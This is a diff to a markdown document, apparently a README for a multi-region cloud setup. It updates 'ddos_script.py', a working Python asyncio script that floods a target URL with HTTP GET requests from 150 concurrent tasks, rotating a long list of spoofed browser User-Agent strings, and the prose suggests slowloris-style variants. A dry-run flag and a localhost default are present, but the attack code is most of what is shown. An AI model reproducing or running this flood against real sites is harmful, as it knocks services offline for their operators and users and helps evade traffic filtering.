@@ -1106,60 +1106,124 @@ output "ap_south_instance_ips" {
 Here is the `ddos_script.py` a "vanilla" python script to do volumetric Layer 7 (http) DoS against a specified target url (you can modify this script to use less resource-intensive techniques like [*slow loris*](https://en.wikipedia.org/wiki/Slowloris_(cyber_attack)):  
 
 ```python
-import threading
-import requests
-import time
+# Simple python script for Layer 7 volumetric DoS
+
+import aiohttp
+import asyncio
+import random
 from datetime import datetime
 
-# Number of threads
-THREADS = 150
-
-# Target URL
-TARGET_URL = "https://example.com"
-
-# Duration of the attack in seconds
-DURATION = 10
+# Global variables
+DRY_RUN = True  # Set to True to simulate requests
+TARGET_URL = "http://localhost:8081"  # launch the 'test_ddos_script_locally.py' first if you want to test this locally
+DURATION = 4  # Total duration of the attack in seconds
+CONCURRENCY = 150  # Number of concurrent tasks
+REQUEST_TIMEOUT = 3  # Timeout for each request in seconds
+# List of User-Agent strings
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.64 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; ARM64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Linux; U; Android 10; en-US; SM-A217F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.124 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
+    "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/120.0.2210.91 Safari/537.36",
+    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6121.41 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
+    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6121.41 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.94 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.94 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.94 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (Windows NT 10.0; ARM64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.94 Safari/537.36",
+    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 12; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.94 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.94 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.7 Safari/537.36",
+]
 
 # Counter for successful requests
 request_count = 0
 
-# Lock to safely update the counter across threads
-lock = threading.Lock()
+# Function to fetch public IP
+async def fetch_public_ip():
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get("https://api.ipify.org") as response:
+                ip = await response.text()
+                return ip
+    except Exception as e:
+        return f"Error fetching IP: {e}"
 
 # Function to send HTTP GET requests
-def send_requests():
+async def send_requests(session):
     global request_count
-    while time.time() < end_time:
+    headers = {"User-Agent": random.choice(USER_AGENTS)}
+    while True:
         try:
-            response = requests.get(TARGET_URL)
-            with lock:
-                request_count += 1  # Safely increment the count
-        except requests.exceptions.RequestException as e:
-            print(f"Error: {e}")
+            if DRY_RUN:
+                print(f"[DRY_RUN] Simulated request to {TARGET_URL}")
+            else:
+                async with session.get(TARGET_URL, headers=headers, timeout=REQUEST_TIMEOUT) as response:
+                    await response.text()  # Ensure response is read
+            request_count += 1
+        except Exception:
+            pass  # Ignore errors
 
-# Print the start time
-print(f"Attack against target {TARGET_URL} started at: {datetime.now()}")
+# Main attack function
+async def main():
+    global request_count
+    start_time = datetime.now()
 
-# Start time of the attack
-start_time = time.time()
+    # Fetch and print public IP address
+    print("Fetching public IP address...")
+    public_ip = await fetch_public_ip()
+    print(f"Public IP Address: {public_ip}")
+    
+    print(f"Attack against target {TARGET_URL} started at: {start_time} (DRY_RUN: {DRY_RUN})")
 
-# End time of the attack
-end_time = start_time + DURATION
+    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
+    async with aiohttp.ClientSession(timeout=timeout) as session:
+        # Create tasks explicitly using asyncio.create_task
+        tasks = [asyncio.create_task(send_requests(session)) for _ in range(CONCURRENCY)]
+        
+        # Run tasks concurrently for the specified duration
+        await asyncio.sleep(DURATION)  # Let tasks run for the attack duration
+        
+        # Cancel all tasks after the duration
+        for task in tasks:
+            task.cancel()
+        await asyncio.gather(*tasks, return_exceptions=True)
 
-# Create and start threads
-threads = []
-for i in range(THREADS):
-    t = threading.Thread(target=send_requests)
-    t.start()
-    threads.append(t)
+    end_time = datetime.now()
+    print(f"Attack ended at: {end_time}")
+    print(f"Total number of requests sent: {request_count}")
 
-# Wait for all threads to complete
-for t in threads:
-    t.join()
+# Run the script
+if __name__ == "__main__":
+    asyncio.run(main())
 
-# Print the end time and total number of requests sent
-print(f"Attack ended at: {datetime.now()}")
-print(f"Total number of requests sent: {request_count}")
 ```   
 
 ### Instructions  
